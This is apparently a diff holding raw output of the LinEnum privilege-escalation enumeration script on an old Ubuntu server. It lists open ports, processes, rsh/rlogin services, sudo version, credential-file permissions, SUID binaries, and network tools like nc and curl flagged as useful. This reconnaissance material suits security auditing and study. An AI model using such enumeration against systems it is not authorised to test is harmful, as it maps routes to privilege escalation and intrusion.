+udp        0      0 0.0.0.0:2049            0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:58051           0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:54483           0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:37079           0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:829             0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:38749           0.0.0.0:*                           -               
+udp6       0      0 :::44018                :::*                                -               
+udp6       0      0 :::2049                 :::*                                -               
+udp6       0      0 :::36369                :::*                                -               
+udp6       0      0 :::41498                :::*                                -               
+udp6       0      0 :::33884                :::*                                -               
+udp6       0      0 :::111                  :::*                                -               
+udp6       0      0 :::39640                :::*                                -               
+udp6       0      0 :::829                  :::*                                -               
+
+
+### SERVICES #############################################
+[-] Running processes:
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1   3512  1936 ?        Ss   Mar02   0:01 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    Mar02   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S    Mar02   0:00 [ksoftirqd/0]
+root         6  0.0  0.0      0     0 ?        S    Mar02   0:00 [migration/0]
+root         7  0.0  0.0      0     0 ?        S    Mar02   0:00 [watchdog/0]
+root         8  0.0  0.0      0     0 ?        S<   Mar02   0:00 [cpuset]
+root         9  0.0  0.0      0     0 ?        S<   Mar02   0:00 [khelper]
+root        10  0.0  0.0      0     0 ?        S    Mar02   0:00 [kdevtmpfs]
+root        11  0.0  0.0      0     0 ?        S<   Mar02   0:00 [netns]
+root        12  0.0  0.0      0     0 ?        S    Mar02   0:00 [sync_supers]
+root        13  0.0  0.0      0     0 ?        S    Mar02   0:00 [bdi-default]
+root        14  0.0  0.0      0     0 ?        S<   Mar02   0:00 [kintegrityd]
+root        15  0.0  0.0      0     0 ?        S<   Mar02   0:00 [kblockd]
+root        16  0.0  0.0      0     0 ?        S<   Mar02   0:00 [ata_sff]
+root        17  0.0  0.0      0     0 ?        S    Mar02   0:00 [khubd]
+root        18  0.0  0.0      0     0 ?        S<   Mar02   0:00 [md]
+root        22  0.0  0.0      0     0 ?        S    Mar02   0:00 [khungtaskd]
+root        23  0.0  0.0      0     0 ?        S    Mar02   0:00 [kswapd0]
+root        24  0.0  0.0      0     0 ?        SN   Mar02   0:00 [ksmd]
+root        25  0.0  0.0      0     0 ?        SN   Mar02   0:00 [khugepaged]
+root        26  0.0  0.0      0     0 ?        S    Mar02   0:00 [fsnotify_mark]
+root        27  0.0  0.0      0     0 ?        S    Mar02   0:00 [ecryptfs-kthrea]
+root        28  0.0  0.0      0     0 ?        S<   Mar02   0:00 [crypto]
+root        36  0.0  0.0      0     0 ?        S<   Mar02   0:00 [kthrotld]
+root        39  0.0  0.0      0     0 ?        S    Mar02   0:00 [scsi_eh_0]
+root        40  0.0  0.0      0     0 ?        S    Mar02   0:00 [scsi_eh_1]
+root        42  0.0  0.0      0     0 ?        S    Mar02   0:00 [scsi_eh_2]
+root        64  0.0  0.0      0     0 ?        S<   Mar02   0:00 [devfreq_wq]
+root       218  0.0  0.0      0     0 ?        S<   Mar02   0:00 [kdmflush]
+root       229  0.0  0.0      0     0 ?        S<   Mar02   0:00 [kdmflush]
+root       240  0.0  0.0      0     0 ?        S    Mar02   0:00 [jbd2/dm-0-8]
+root       241  0.0  0.0      0     0 ?        S<   Mar02   0:00 [ext4-dio-unwrit]
+root       437  0.0  0.0   2816   612 ?        S    Mar02   0:00 upstart-udev-bridge --daemon
+root       440  0.0  0.1   3036  1220 ?        Ss   Mar02   0:00 /sbin/udevd --daemon
+root       524  0.0  0.0      0     0 ?        S<   Mar02   0:00 [kpsmoused]
+root       526  0.0  0.0   3032   832 ?        S    Mar02   0:00 /sbin/udevd --daemon
+root       527  0.0  0.0   2988   780 ?        S    Mar02   0:00 /sbin/udevd --daemon
+root       657  0.0  0.0   2744  1016 ?        Ss   Mar02   0:00 rpcbind -w
+root       667  0.0  0.0   2828   364 ?        S    Mar02   0:00 upstart-socket-bridge --daemon
+root       715  0.0  0.0      0     0 ?        S<   Mar02   0:00 [rpciod]
+root       722  0.0  0.0      0     0 ?        S<   Mar02   0:00 [nfsiod]
+102        752  0.0  0.0   3240   888 ?        Ss   Mar02   0:00 dbus-daemon --system --fork --activation=upstart
+root       757  0.0  0.0   2892   772 ?        Ss   Mar02   0:00 rpc.idmapd
+syslog     764  0.0  0.1  30784  1904 ?        Sl   Mar02   0:06 rsyslogd -c5
+statd      765  0.0  0.1   2984  1356 ?        Ss   Mar02   0:00 rpc.statd -L
+root       808  0.0  0.0   2908   416 ?        Ss   Mar02   0:00 dhclient3 -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -1 eth0
+root       830  1.1  0.2   6664  2404 ?        Ss   Mar02   2:16 /usr/sbin/sshd -D
+root       912  0.0  0.0   4612   840 tty4     Ss+  Mar02   0:00 /sbin/getty -8 38400 tty4
+root       917  0.0  0.0   4612   840 tty5     Ss+  Mar02   0:00 /sbin/getty -8 38400 tty5
+root       929  0.0  0.0   4612   840 tty2     Ss+  Mar02   0:00 /sbin/getty -8 38400 tty2
+root       930  0.0  0.0   4612   840 tty3     Ss+  Mar02   0:00 /sbin/getty -8 38400 tty3
+root       933  0.0  0.0   4612   832 tty6     Ss+  Mar02   0:00 /sbin/getty -8 38400 tty6
+root       936  0.0  0.0   2412   712 ?        S    Mar02   0:00 /usr/sbin/inetutils-inetd
+root       953  0.0  0.1   2992  1180 ?        Ss   Mar02   0:04 /usr/sbin/dovecot -F -c /etc/dovecot/dovecot.conf
+root       955  0.0  0.0   2156   604 ?        Ss   Mar02   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
+root       956  0.0  0.0   2600   764 ?        Ss   Mar02   0:00 cron
+daemon     957  0.0  0.0   2452   348 ?        Ss   Mar02   0:00 atd
+dovecot    976  0.0  0.0   2704   836 ?        S    Mar02   0:00 dovecot/anvil
+root       977  0.0  0.0   2700   932 ?        S    Mar02   0:01 dovecot/log
+whoopsie   981  0.0  0.3  24416  3140 ?        Ssl  Mar02   0:00 whoopsie
+root      1012  0.0  0.0      0     0 ?        S    Mar02   0:00 [lockd]
+root      1013  0.0  0.0      0     0 ?        S<   Mar02   0:00 [nfsd4]
+root      1014  0.0  0.0      0     0 ?        S<   Mar02   0:00 [nfsd4_callbacks]
+root      1015  0.0  0.0      0     0 ?        S    Mar02   0:00 [nfsd]
+root      1016  0.0  0.0      0     0 ?        S    Mar02   0:00 [nfsd]
+root      1017  0.0  0.0      0     0 ?        S    Mar02   0:00 [nfsd]
+root      1018  0.0  0.0      0     0 ?        S    Mar02   0:00 [nfsd]
+root      1019  0.0  0.0      0     0 ?        S    Mar02   0:00 [nfsd]
+root      1020  0.0  0.0      0     0 ?        S    Mar02   0:00 [nfsd]
+root      1021  0.0  0.0      0     0 ?        S    Mar02   0:00 [nfsd]
+root      1022  0.0  0.0      0     0 ?        S    Mar02   0:00 [nfsd]
+root      1026  0.0  0.1   3568  1764 ?        Ss   Mar02   0:00 /usr/sbin/rpc.mountd --manage-gids
+root      1130  0.0  0.1   4560  1464 ?        Ss   Mar02   0:00 /usr/lib/postfix/master
+postfix   1134  0.0  0.1   4628  1352 ?        S    Mar02   0:00 qmgr -l -t fifo -u
+root      1148  0.0  0.0      0     0 ?        S    Mar02   0:00 [flush-252:0]
+root      1175  0.0  0.0   4612   836 tty1     Ss+  Mar02   0:00 /sbin/getty -8 38400 tty1
+postfix   1193  0.0  0.2   7164  2604 ?        S    Mar02   0:00 tlsmgr -l -t unix -u -c
+root     12986  0.0  0.0      0     0 ?        S    Mar02   0:00 [kworker/u:2]
+root     14153  0.0  0.0      0     0 ?        S    Mar02   0:00 [kworker/u:1]
+postfix  14401  0.0  0.1   4580  1416 ?        S    Mar02   0:00 pickup -l -t fifo -u -c
+root     27912  0.0  0.0      0     0 ?        S    Mar02   0:00 [kworker/0:1]
+root     29523  0.0  0.2   9632  3060 ?        Ss   Mar02   0:00 sshd: user [priv]   
+user     29645  0.0  0.1   9632  1552 ?        S    00:00   0:00 sshd: user@pts/0    
+user     29646  0.0  0.6   9728  6172 pts/0    Ss   00:00   0:00 -bash
+root     30154  0.0  0.0      0     0 ?        S    00:06   0:00 [kworker/0:0]
+root     30662  0.0  0.0      0     0 ?        S    00:11   0:00 [kworker/0:2]
+root     31294  0.0  0.2   8272  2932 ?        Ss   00:15   0:00 sshd: backup [priv] 
+root     31295  0.0  0.2   8272  2932 ?        Ss   00:15   0:00 sshd: backup [priv] 
+root     31296  0.0  0.2   8272  2936 ?        Ss   00:15   0:00 sshd: backup [priv] 
+root     31297  0.0  0.2   8272  2936 ?        Ss   00:15   0:00 sshd: backup [priv] 
+sshd     31298  0.0  0.0   8008   896 ?        S    00:15   0:00 sshd: backup [net]  
+sshd     31299  0.0  0.0   8008   900 ?        S    00:15   0:00 sshd: backup [net]  
+sshd     31300  0.0  0.0   8008   896 ?        S    00:15   0:00 sshd: backup [net]  
+sshd     31301  0.0  0.0   8008   896 ?        S    00:15   0:00 sshd: backup [net]  
+user     31302  0.0  0.1   5604  1760 pts/0    S+   00:15   0:00 /bin/bash ./LinEnum.sh -t
+user     31303  0.1  0.1   5784  1456 pts/0    S+   00:15   0:00 /bin/bash ./LinEnum.sh -t
+user     31304  0.0  0.0   4212   592 pts/0    S+   00:15   0:00 tee -a
+postfix  31386  0.0  0.1   4672  1548 ?        S    00:15   0:00 cleanup -z -t unix -u -c
+postfix  31387  0.0  0.1   4588  1340 ?        S    00:15   0:00 trivial-rewrite -n rewrite -t unix -u -c
+postfix  31388  0.0  0.2   4804  2120 ?        S    00:15   0:00 local -t unix
+root     31391  0.0  0.2   8272  2920 ?        Ss   00:15   0:00 sshd: backup [priv] 
+root     31392  0.0  0.2   8272  2928 ?        Ss   00:15   0:00 sshd: backup [priv] 
+root     31393  0.0  0.2   8272  2924 ?        Ss   00:15   0:00 sshd: backup [priv] 
+root     31394  0.0  0.2   8272  2924 ?        Ss   00:15   0:00 sshd: backup [priv] 
+root     31395  0.0  0.2   8272  2928 ?        Ss   00:15   0:00 sshd: backup [priv] 
+root     31396  0.0  0.2   8272  2928 ?        Ss   00:15   0:00 sshd: backup [priv] 
+sshd     31397  0.0  0.0   8008   900 ?        S    00:15   0:00 sshd: backup [net]  
+sshd     31398  0.0  0.0   8008   896 ?        S    00:15   0:00 sshd: backup [net]  
+sshd     31399  0.0  0.0   8008   896 ?        S    00:15   0:00 sshd: backup [net]  
+sshd     31400  0.0  0.0   8008   900 ?        S    00:15   0:00 sshd: backup [net]  
+sshd     31401  0.0  0.0   8008   900 ?        S    00:15   0:00 sshd: backup [net]  
+sshd     31402  0.0  0.0   8008   900 ?        S    00:15   0:00 sshd: backup [net]  
+user     31562  0.0  0.1   5784  1180 pts/0    S+   00:15   0:00 /bin/bash ./LinEnum.sh -t
+user     31563  0.0  0.1   4924  1160 pts/0    R+   00:15   0:00 ps aux
+
+
+[-] Process binaries and associated permissions (from above list):
+900K -rwxr-xr-x 1 root root 900K Apr  3  2012 /bin/bash
+ 28K -rwxr-xr-x 2 root root  27K Mar 30  2012 /sbin/getty
+188K -rwxr-xr-x 1 root root 186K Apr 26  2012 /sbin/init
+176K -rwxr-xr-x 1 root root 174K Jul 19  2012 /sbin/udevd
+ 40K -rwxr-xr-x 1 root root  38K Jul 30  2012 /usr/lib/postfix/master
+ 64K -rwxr-xr-x 1 root root  62K Jun 29  2012 /usr/sbin/dovecot
+ 64K -rwxr-xr-x 1 root root  63K Jan  3  2012 /usr/sbin/inetutils-inetd
+260K -rwxr-xr-x 1 root root 257K Apr  9  2012 /usr/sbin/rpc.mountd
+516K -rwxr-xr-x 1 root root 516K Apr  2  2012 /usr/sbin/sshd
+
+
+[-] Contents of /etc/inetd.conf:
+# /etc/inetd.conf:  see inetd(8) for further informations.
+#
+# Internet superserver configuration database
+#
+#
+# Lines starting with "#:LABEL:" or "#<off>#" should not
+# be changed unless you know what you are doing!
+#
+# If you want to disable an entry so it isn't touched during
+# package updates just comment it out with a single '#' character.
+#
+# Packages should modify this file by using update-inetd(8)
+#
+# <service_name> <sock_type> <proto> <flags> <user> <server_path> <args>
+#
+#:INTERNAL: Internal services
+#discard		stream	tcp	nowait	root	internal
+#discard		dgram	udp	wait	root	internal
+#daytime		stream	tcp	nowait	root	internal
+#time		stream	tcp	nowait	root	internal
+
+#:STANDARD: These are standard services.
+
+#:BSD: Shell, login, exec and talk are BSD protocols.
+shell		stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/in.rshd
+login		stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/in.rlogind
+exec		stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/in.rexecd
+
+#:MAIL: Mail, news and uucp services.
+
+#:INFO: Info services
+finger		stream	tcp	nowait	nobody	/usr/sbin/tcpd	/usr/sbin/in.fingerd
+
+#:BOOT: TFTP service is provided primarily for booting.  Most sites
+#       run this only on machines acting as "boot servers."
+
+#:RPC: RPC based services
+
+#:HAM-RADIO: amateur-radio services
+
+#:OTHER: Other services
+
+
+[-] The related inetd binary permissions:
+-rwxr-xr-x 1 root root  9928 May  9  2010 /usr/sbin/in.fingerd
+-rwxr-xr-x 1 root root  9968 Jun 26  2010 /usr/sbin/in.rexecd
+-rwxr-xr-x 1 root root 18268 Jun 26  2010 /usr/sbin/in.rlogind
+-rwxr-xr-x 1 root root 18580 Jun 26  2010 /usr/sbin/in.rshd
+
+
+[-] /etc/init.d/ binary permissions:
+total 160
+drwxr-xr-x  2 root root 4096 Sep  2  2012 .
+drwxr-xr-x 91 root root 4096 Mar  2 21:00 ..
+lrwxrwxrwx  1 root root   21 Dec  8  2011 acpid -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 4596 Apr 12  2012 apparmor
+lrwxrwxrwx  1 root root   21 Jul 27  2012 apport -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Oct 25  2011 atd -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 2444 Jul 26  2012 bootlogd
+lrwxrwxrwx  1 root root   21 Apr 19  2012 console-setup -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Jun 19  2012 cron -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Feb 22  2012 dbus -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Mar 30  2012 dmesg -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 1242 Dec 13  2011 dns-clean
+lrwxrwxrwx  1 root root   21 Jun 29  2012 dovecot -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Mar 14  2012 friendly-recovery -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 1105 May 17  2012 grub-common
+lrwxrwxrwx  1 root root   21 Apr  9  2012 gssd -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 1329 Jul 26  2012 halt
+lrwxrwxrwx  1 root root   21 May 26  2011 hostname -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Mar 30  2012 hwclock -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Mar 30  2012 hwclock-save -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Apr  9  2012 idmapd -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 1925 Nov  4  2011 inetutils-inetd
+lrwxrwxrwx  1 root root   21 Feb  4  2012 irqbalance -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 1293 Jul 26  2012 killprocs
+-rw-r--r--  1 root root    0 Sep  2  2012 .legacy-bootordering
+lrwxrwxrwx  1 root root   21 Nov 20  2011 module-init-tools -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 2797 Feb 13  2012 networking
+lrwxrwxrwx  1 root root   21 Apr  5  2012 network-interface -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Apr  5  2012 network-interface-container -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Apr  5  2012 network-interface-security -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 4796 Apr  9  2012 nfs-kernel-server
+-rwxr-xr-x  1 root root  882 Jul 26  2012 ondemand
+lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth-log -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth-splash -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth-stop -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth-upstart-bridge -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 May 31  2012 portmap -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 May 31  2012 portmap-wait -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 7355 Jul 30  2012 postfix
+-rwxr-xr-x  1 root root  561 Feb  4  2011 pppd-dns
+lrwxrwxrwx  1 root root   21 Dec 12  2011 procps -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 8635 Jul 26  2012 rc
+-rwxr-xr-x  1 root root  801 Jul 26  2012 rc.local
+-rwxr-xr-x  1 root root  117 Jul 26  2012 rcS
+-rw-r--r--  1 root root 2427 Jul 26  2012 README
+-rwxr-xr-x  1 root root  639 Jul 26  2012 reboot
+lrwxrwxrwx  1 root root   21 Jul 21  2012 resolvconf -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 May 31  2012 rpcbind-boot -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 4395 Nov  8  2011 rsync
+lrwxrwxrwx  1 root root   21 Mar 30  2012 rsyslog -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Jun  6  2011 screen-cleanup -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 4321 Jul 26  2012 sendsigs
+lrwxrwxrwx  1 root root   21 Apr 19  2012 setvtrgb -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  590 Jul 26  2012 single
+-rw-r--r--  1 root root 4304 Jul 26  2012 skeleton
+-rwxr-xr-x  1 root root 4371 Apr  2  2012 ssh
+lrwxrwxrwx  1 root root   21 Apr  9  2012 statd -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Apr  9  2012 statd-mounting -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  567 Jul 26  2012 stop-bootlogd
+-rwxr-xr-x  1 root root 1143 Jul 26  2012 stop-bootlogd-single
+-rwxr-xr-x  1 root root  700 May 23  2012 sudo
+lrwxrwxrwx  1 root root   21 Jul 19  2012 udev -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Jul 19  2012 udev-fallback-graphics -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Jul 19  2012 udev-finish -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Jul 19  2012 udevmonitor -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Jul 19  2012 udevtrigger -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root   21 Apr  5  2012 ufw -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root 2800 Jul 26  2012 umountfs
+-rwxr-xr-x  1 root root 2211 Jul 26  2012 umountnfs.sh
+-rwxr-xr-x  1 root root 2926 Jul 26  2012 umountroot
+-rwxr-xr-x  1 root root 1985 Jul 26  2012 urandom
+lrwxrwxrwx  1 root root   21 Apr 18  2012 whoopsie -> /lib/init/upstart-job
+
+
+[-] /etc/init/ config file permissions:
+total 300
+drwxr-xr-x  2 root root 4096 Sep  2  2012 .
+drwxr-xr-x 91 root root 4096 Mar  2 21:00 ..
+-rw-r--r--  1 root root  320 Dec  8  2011 acpid.conf
+-rw-r--r--  1 root root 1309 Jul 27  2012 apport.conf
+-rw-r--r--  1 root root  261 Oct 25  2011 atd.conf
+-rw-r--r--  1 root root  266 Apr 26  2012 console.conf
+-rw-r--r--  1 root root  509 Dec 21  2010 console-setup.conf
+-rw-r--r--  1 root root 1122 Apr 26  2012 container-detect.conf
+-rw-r--r--  1 root root  356 Apr 26  2012 control-alt-delete.conf
+-rw-r--r--  1 root root  297 Jun 19  2012 cron.conf
+-rw-r--r--  1 root root  510 Jan 10  2012 dbus.conf
+-rw-r--r--  1 root root  273 Mar 30  2012 dmesg.conf
+-rw-r--r--  1 root root 1096 Jun 28  2012 dovecot.conf
+-rw-r--r--  1 root root 1377 Apr 26  2012 failsafe.conf
+-rw-r--r--  1 root root  267 Apr 26  2012 flush-early-job-log.conf
+-rw-r--r--  1 root root 1247 Mar 14  2012 friendly-recovery.conf
+-rw-r--r--  1 root root 1985 Mar 27  2012 gssd.conf
+-rw-r--r--  1 root root  317 May 26  2011 hostname.conf
+-rw-r--r--  1 root root  557 Mar 30  2012 hwclock.conf
+-rw-r--r--  1 root root  444 Mar 30  2012 hwclock-save.conf
+-rw-r--r--  1 root root  976 Mar 27  2012 idmapd.conf
+-rw-r--r--  1 root root  571 Feb  4  2012 irqbalance.conf
+-rw-r--r--  1 root root  367 Mar 18  2011 module-init-tools.conf
+-rw-r--r--  1 root root  943 Apr 12  2012 mountall.conf
+-rw-r--r--  1 root root  349 Apr 12  2012 mountall-net.conf
+-rw-r--r--  1 root root  261 Apr 12  2012 mountall-reboot.conf
+-rw-r--r--  1 root root 1201 Apr 12  2012 mountall-shell.conf
+-rw-r--r--  1 root root  405 Apr 12  2012 mounted-debugfs.conf
+-rw-r--r--  1 root root  550 Apr 12  2012 mounted-dev.conf
+-rw-r--r--  1 root root  480 Apr 12  2012 mounted-proc.conf
+-rw-r--r--  1 root root  610 Apr 12  2012 mounted-run.conf
+-rw-r--r--  1 root root 1890 Apr 12  2012 mounted-tmp.conf
+-rw-r--r--  1 root root  903 Apr 12  2012 mounted-var.conf
+-rw-r--r--  1 root root  388 Apr  5  2012 networking.conf
+-rw-r--r--  1 root root  803 Apr  5  2012 network-interface.conf
+-rw-r--r--  1 root root  523 Apr  5  2012 network-interface-container.conf
+-rw-r--r--  1 root root 1603 Apr  5  2012 network-interface-security.conf
+-rw-r--r--  1 root root  971 Nov  9  2011 plymouth.conf
+-rw-r--r--  1 root root  326 Mar 26  2010 plymouth-log.conf
+-rw-r--r--  1 root root  899 Mar 18  2011 plymouth-splash.conf
+-rw-r--r--  1 root root  800 Apr 13  2012 plymouth-stop.conf
+-rw-r--r--  1 root root  367 Jan 25  2011 plymouth-upstart-bridge.conf
+-rw-r--r--  1 root root  853 May 30  2012 portmap.conf
+-rw-r--r--  1 root root  805 May 30  2012 portmap-wait.conf
+-rw-r--r--  1 root root  363 Dec  5  2011 procps.conf
+-rw-r--r--  1 root root  454 Apr 26  2012 rc.conf
+-rw-r--r--  1 root root  705 Apr 26  2012 rcS.conf
+-rw-r--r--  1 root root 1543 Apr 26  2012 rc-sysinit.conf
+-rw-r--r--  1 root root  457 Jul 18  2012 resolvconf.conf
+-rw-r--r--  1 root root  209 May 30  2012 rpcbind-boot.conf
+-rw-r--r--  1 root root  426 Mar 30  2012 rsyslog.conf
+-rw-r--r--  1 root root  683 Jun  6  2011 screen-cleanup.conf
+-rw-r--r--  1 root root  230 Mar 18  2011 setvtrgb.conf
+-rw-r--r--  1 root root  277 Apr 26  2012 shutdown.conf
+-rw-r--r--  1 root root  667 Feb  6  2012 ssh.conf
+-rw-r--r--  1 root root 1188 Mar 27  2012 statd.conf
+-rw-r--r--  1 root root  738 Mar 27  2012 statd-mounting.conf
+-rw-r--r--  1 root root  348 Apr 26  2012 tty1.conf
+-rw-r--r--  1 root root  333 Apr 26  2012 tty2.conf
+-rw-r--r--  1 root root  333 Apr 26  2012 tty3.conf
+-rw-r--r--  1 root root  333 Apr 26  2012 tty4.conf
+-rw-r--r--  1 root root  232 Apr 26  2012 tty5.conf
+-rw-r--r--  1 root root  232 Apr 26  2012 tty6.conf
+-rw-r--r--  1 root root  322 Nov 15  2011 udev.conf
+-rw-r--r--  1 root root  637 Jul 16  2012 udev-fallback-graphics.conf
+-rw-r--r--  1 root root  769 Oct 21  2011 udev-finish.conf
+-rw-r--r--  1 root root  356 Oct 21  2011 udevmonitor.conf
+-rw-r--r--  1 root root  352 Jul 16  2012 udevtrigger.conf
+-rw-r--r--  1 root root  473 Apr  5  2012 ufw.conf
+-rw-r--r--  1 root root  329 Apr 26  2012 upstart-socket-bridge.conf
+-rw-r--r--  1 root root  553 Apr 26  2012 upstart-udev-bridge.conf
+-rw-r--r--  1 root root  889 Feb  4  2012 ureadahead.conf
+-rw-r--r--  1 root root  683 Feb  4  2012 ureadahead-other.conf
+-rw-r--r--  1 root root 1481 Apr 26  2012 wait-for-state.conf
+-rw-r--r--  1 root root  362 Apr 18  2012 whoopsie.conf
+
+
+[-] /lib/systemd/* config file permissions:
+/lib/systemd/:
+total 4.0K
+drwxr-xr-x 6 root root 4.0K Sep  2  2012 system
+
+/lib/systemd/system:
+total 56K
+drwxr-xr-x 2 root root 4.0K Sep  2  2012 dbus.target.wants
+drwxr-xr-x 2 root root 4.0K Sep  2  2012 multi-user.target.wants
+drwxr-xr-x 2 root root 4.0K Sep  2  2012 sockets.target.wants
+drwxr-xr-x 2 root root 4.0K Sep  2  2012 basic.target.wants
+-rw-r--r-- 1 root root  433 Aug  2  2012 accounts-daemon.service
+-rw-r--r-- 1 root root  164 Jul 19  2012 udev-control.socket
+-rw-r--r-- 1 root root  177 Jul 19  2012 udev-kernel.socket
+-rw-r--r-- 1 root root  341 Jul 19  2012 udev.service
+-rw-r--r-- 1 root root  752 Jul 19  2012 udev-settle.service
+-rw-r--r-- 1 root root  291 Jul 19  2012 udev-trigger.service
+-rw-r--r-- 1 root root  231 Mar 30  2012 rsyslog.service
+-rw-r--r-- 1 root root  419 Feb 22  2012 dbus.service
+-rw-r--r-- 1 root root  106 Feb 22  2012 dbus.socket
+-rw-r--r-- 1 root root  188 Nov  8  2011 rsync.service
+
+/lib/systemd/system/dbus.target.wants:
+total 0
+lrwxrwxrwx 1 root root 14 Feb 22  2012 dbus.socket -> ../dbus.socket
+
+/lib/systemd/system/multi-user.target.wants:
+total 0
+lrwxrwxrwx 1 root root 15 Feb 22  2012 dbus.service -> ../dbus.service
+
+/lib/systemd/system/sockets.target.wants:
+total 0
+lrwxrwxrwx 1 root root 22 Jul 19  2012 udev-control.socket -> ../udev-control.socket
+lrwxrwxrwx 1 root root 21 Jul 19  2012 udev-kernel.socket -> ../udev-kernel.socket
+lrwxrwxrwx 1 root root 14 Feb 22  2012 dbus.socket -> ../dbus.socket
+
+/lib/systemd/system/basic.target.wants:
+total 0
+lrwxrwxrwx 1 root root 15 Jul 19  2012 udev.service -> ../udev.service
+lrwxrwxrwx 1 root root 23 Jul 19  2012 udev-trigger.service -> ../udev-trigger.service
+
+
+### SOFTWARE #############################################
+[-] Sudo version:
+Sudo version 1.8.3p1
+
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/curl
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r-- 1 root root 1312 Sep  2  2012 /etc/passwd
+-rw-r--r-- 1 root root 720 Sep  2  2012 /etc/group
+-rw-r--r-- 1 root root 665 Sep  2  2012 /etc/profile
+-rw-r----- 1 root shadow 1111 Sep  2  2012 /etc/shadow
+
+
+[-] SUID files:
+-rwsr-xr-x 1 root root 96904 Apr  9  2012 /sbin/mount.nfs
+-rwsr-sr-x 1 libuuid libuuid 17976 Mar 30  2012 /usr/sbin/uuidd
+-rwsr-xr-- 1 root dip 273272 Feb  4  2011 /usr/sbin/pppd
+-rwsr-xr-x 1 root root 5564 Dec 13  2011 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-- 1 root messagebus 316824 Feb 22  2012 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 248056 Apr  2  2012 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 9728 Apr 20  2012 /usr/lib/pt_chown
+-rwsr-xr-x 1 root root 56208 Jul 28  2011 /usr/bin/mtr
+-rwsr-xr-x 2 root root 69708 Jun  1  2012 /usr/bin/sudo
+-rwsr-xr-x 1 root root 30896 Apr  9  2012 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 41284 Apr  9  2012 /usr/bin/passwd
+-rwsr-xr-x 1 root root 40292 Apr  9  2012 /usr/bin/chfn
+-rwsr-sr-x 1 daemon daemon 42800 Oct 25  2011 /usr/bin/at
+-rwsr-xr-x 2 root root 69708 Jun  1  2012 /usr/bin/sudoedit
+-rwsr-xr-x 1 root root 14012 Nov  8  2011 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 57956 Apr  9  2012 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 31748 Apr  9  2012 /usr/bin/chsh
+-rwsr-sr-x 1 root mail 75600 Aug  4  2010 /usr/bin/procmail
+-rwsr-xr-x 1 root root 39116 Nov  8  2011 /bin/ping6
+-rwsr-xr-x 1 root root 88760 Mar 30  2012 /bin/mount
+-rwsr-xr-x 1 root root 67720 Mar 30  2012 /bin/umount
+-rwsr-xr-x 1 root root 31116 Apr  9  2012 /bin/su
+-rwsr-xr-x 1 root root 34740 Nov  8  2011 /bin/ping
+-rwsr-xr-x 1 root root 26252 Mar  2  2012 /bin/fusermount
+
+
+[+] Possibly interesting SUID files:
+-rwsr-xr-x 1 root root 248056 Apr  2  2012 /usr/lib/openssh/ssh-keysign
+
+
+[-] GUID files:
